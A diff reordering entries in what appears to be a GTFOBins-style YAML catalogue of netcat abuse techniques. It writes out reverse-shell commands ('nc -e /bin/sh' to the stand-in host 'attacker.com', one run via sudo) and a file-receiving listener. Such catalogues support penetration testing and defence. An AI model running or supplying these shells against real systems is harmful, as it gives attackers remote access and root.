@@ -24,16 +24,16 @@ functions:
         LPORT=12345
         LFILE=file_to_save
         nc -l -p $LPORT > "$LFILE"
-  suid-limited:
-    - description: Run `nc -l -p 12345` on the attacker box to receive the shell. This only works with netcat traditional.
-      code: |
-        RHOST=attacker.com
-        RPORT=12345
-        ./nc -e /bin/sh $RHOST $RPORT
   sudo-enabled:
     - description: Run `nc -l -p 12345` on the attacker box to receive the shell. This only works with netcat traditional.
       code: |
         RHOST=attacker.com
         RPORT=12345
         sudo nc -e /bin/sh $RHOST $RPORT
+  suid-limited:
+    - description: Run `nc -l -p 12345` on the attacker box to receive the shell. This only works with netcat traditional.
+      code: |
+        RHOST=attacker.com
+        RPORT=12345
+        ./nc -e /bin/sh $RHOST $RPORT
 ---
